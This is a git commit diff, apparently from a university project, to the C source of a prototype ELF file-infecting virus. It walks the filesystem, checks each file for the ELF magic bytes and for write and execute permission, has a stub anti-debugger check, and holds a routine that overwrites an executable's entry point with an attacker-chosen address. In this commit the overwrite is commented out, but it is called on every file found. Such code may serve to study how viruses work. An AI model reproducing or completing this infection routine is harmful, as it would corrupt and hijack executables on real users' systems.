c57dfd4ca53faf668c09dff232e1ce82c0b3083f
Jiwon Choi <jiwon.choi@kaist.ac.kr>
2018-05-08 07:41:35 -0400

    Add permission check routine

--- src/temp.c
+++ src/temp.c
@@ -13,69 +13,60 @@
 #define SPARE_FDS  (4)
 #define MAX_FDS    (512)
 
-const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};
-
 void infect(const char* fpath){
     printf("%s will be infected.\n", fpath);
-}
-
-int can_execute(const struct stat *sb, const char* fpath){
-    return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
-        || (sb->st_mode & S_IXOTH);
-}
-
-int can_write(const struct stat *sb, const char* fpath){
-    return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
-        || (sb->st_mode & S_IWOTH);
-}
-
-int is_elf(const char* fpath){
-    Elf64_Ehdr header; // Assuming 64-bit ELF file.
-    size_t nb;
-    int ret = 0;
-    FILE* f;
-
-    f = fopen(fpath, "rb");
-    if (!f) return 0;
-
-    nb = fread(&header, 1, sizeof(header), f);
-    if (nb == sizeof(header)) {
-        if (memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
-            ret = 1;
-        }
-    }
-    fclose(f);
-    return ret;
 }
 
 int activate(){
     return 1; // 
 }
 
-
 void change_entrypoint(const char* fpath, char *newaddr){
 	int fd;
-	Elf32_Ehdr ehdr;
-
-	fd = open(fpath, O_RDWR); // read and write
-	if (fd < 0) exit(1); // open 실패
-	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); // read 실패
-
-	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	//Elf32_Ehdr ehdr;
+	Elf64_Ehdr ehdr; // Assuming 64-bit ELF file.
 	
+	if(access(fpath,R_OK|W_OK|X_OK)!=0){ // 성공하면 0, 실패하면 -1
+		printf("Permission error! : %s\n",fpath);
+		//exit(1);
+	}
+	if(!activate()){
+		printf("Debugger detected!\n");
+		//exit(1);
+	}
+	fd = open(fpath, O_RDWR); // readable, writable 하게 열어야 하는데... 
+	if (fd < 0){
+		printf("fd error\n");
+		//exit(1); 
+	}
+	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
+		printf("read error\n");
+		//exit(1); 
+	}
+	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ //elf가 아니라면
+		printf("%s is not ELF! it is %s!\n",fpath,ehdr.e_ident);
+		//exit(1);
+	}
+	printf("[INFECTED] Entry point (%s): 0x%x\n\n\n", fpath, ehdr.e_entry);
+	
+	
+	// Entry point overwriting routine.. Don't touch it!
+	/*
 	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
 	lseek(fd, 0, SEEK_SET);
 	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); //write 실패
 
 	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
-	exit(0);
+	*/
+	
+	// exit(0);
 }
-
 
 int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
     int ret = 0;
-    if (flag == FTW_F && can_execute(sb, fpath) && can_write(sb, fpath) && is_elf(fpath) && activate()) 
-        infect(fpath);
+    if (flag == FTW_F && activate()) 
+		change_entrypoint(fpath, "0x11111111");
+        
     return ret;
 }
 
